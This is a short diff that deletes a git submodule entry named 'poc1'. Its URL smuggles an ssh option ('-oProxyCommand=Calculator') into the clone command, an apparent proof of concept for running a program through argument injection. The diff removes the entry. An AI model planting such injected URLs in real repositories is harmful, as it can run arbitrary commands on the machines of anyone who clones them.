@@ -1,2 +1,0 @@
-[submodule "poc1"]
-    url = ssh://-oProxyCommand=Calculator/cert
